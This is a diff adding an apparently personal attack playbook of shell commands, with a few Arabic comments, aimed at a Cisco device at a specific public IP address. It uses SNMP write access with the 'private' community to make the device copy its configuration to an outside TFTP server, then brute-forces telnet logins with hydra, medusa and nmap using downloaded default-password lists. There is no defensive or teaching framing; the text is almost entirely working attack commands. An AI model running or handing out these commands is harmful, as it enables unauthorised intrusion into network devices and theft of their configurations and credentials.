@@ -1,0 +1,66 @@
+snmpset -v2c -c private 105.155.252.6 1.3.6.1.2.1.1.4.0 s test
+
+apt update && apt install -y tftpd-hpa
+sed -i 's|^TFTP_DIRECTORY=.*|TFTP_DIRECTORY="/srv/tftp"|; s|^TFTP_OPTIONS=.*|TFTP_OPTIONS="--secure --create"|' /etc/default/tftpd-hpa
+mkdir -p /srv/tftp && chmod 777 /srv/tftp
+systemctl restart tftpd-hpa
+
+pip install tftpy
+python3 -c "from tftpy import TftpServer; TftpServer('/srv/tftp').listen('0.0.0.0', 69)"
+
+snmpset -v2c -c private 105.155.252.6 \
+1.3.6.1.4.1.9.9.96.1.1.1.1.2.77 i 1 \
+1.3.6.1.4.1.9.9.96.1.1.1.1.3.77 i 4 \
+1.3.6.1.4.1.9.9.96.1.1.1.1.4.77 i 1 \
+1.3.6.1.4.1.9.9.96.1.1.1.1.5.77 a 1.2.3.4 \
+1.3.6.1.4.1.9.9.96.1.1.1.1.6.77 s vnresroub.cfg \
+1.3.6.1.4.1.9.9.96.1.1.1.1.14.77 i 4
+
+snmpget -v2c -c private 105.155.252.6 1.3.6.1.4.1.9.9.96.1.1.1.1.10.77
+snmpget -v2c -c private 105.155.252.6 1.3.6.1.4.1.9.9.96.1.1.1.1.13.77
+
+
+snmpset -v2c -c private 105.155.252.6 1.3.6.1.4.1.9.9.96.1.1.1.1.14.77 i 6
+
+snmpwalk -v2c -c private 105.155.252.6 1.3.6.1.4.1.9.9.96.1.1.1.1.5
+snmpwalk -v2c -c private 105.155.252.6 1.3.6.1.4.1.9.9.96.1.1.1.1.6
+snmpwalk -v2c -c private 105.155.252.6 1.3.6.1.4.1.9.9.96.1.1.1.1.10
+
+curl -L -o cisco.txt https://raw.githubusercontent.com/rapid7/metasploit-framework/master/data/wordlists/cisco_default.txt
+wc -l cisco.txt
+
+printf 'cisco\nadmin\nroot\nuser\nadmin1\n' > users.txt
+hydra -L users.txt -P cisco.txt -t 4 -f 105.155.252.6 telnet
+
+snmpset ... 1.3.6.1.2.1.1.4.0 s test   →   SNMPv2-MIB::sysContact.0 = STRING: test
+
+apt update && apt install -y tftpd-hpa
+sed -i 's|^TFTP_DIRECTORY=.*|TFTP_DIRECTORY="/srv/tftp"|; s|^TFTP_OPTIONS=.*|TFTP_OPTIONS="--secure --create"|' /etc/default/tftpd-hpa
+mkdir -p /srv/tftp && chmod 777 /srv/tftp
+systemctl restart tftpd-hpa
+
+pip install tftpy
+python3 -c "from tftpy import TftpServer; TftpServer('/srv/tftp').listen('0.0.0.0', 69)"
+
+snmpset -v2c -c private 105.155.252.6 \
+1.3.6.1.4.1.9.9.96.1.1.1.1.2.78 i 1 \
+1.3.6.1.4.1.9.9.96.1.1.1.1.3.78 i 4 \
+1.3.6.1.4.1.9.9.96.1.1.1.1.4.78 i 1 \
+1.3.6.1.4.1.9.9.96.1.1.1.1.5.78 a <عنوان_السيرفر> \
+1.3.6.1.4.1.9.9.96.1.1.1.1.6.78 s vnresroub.cfg \
+1.3.6.1.4.1.9.9.96.1.1.1.1.14.78 i 4
+
+snmpget -v2c -c private 105.155.252.6 1.3.6.1.4.1.9.9.96.1.1.1.1.10.78
+
+snmpset -v2c -c private 105.155.252.6 1.3.6.1.4.1.9.9.96.1.1.1.1.14.78 i 6 تنضيف 
+curl -L -o cisco.txt https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials/default-passwords.txt
+wc -l cisco.txt        # يجب أن تكون ~1335 سطرًا
+
+printf 'cisco\nadmin\nroot\nuser\nadmin1\n' > users.txt
+hydra -L users.txt -P cisco.txt -t 4 -f 105.155.252.6 telnet
+
+
+pkg install medusa
+medusa -h 105.155.252.6 -U users.txt -P cisco.txt -M telnet -t 4
+
+nmap -p 23 --script telnet-brute --script-args userdb=users.txt,passdb=cisco.txt 105.155.252.6
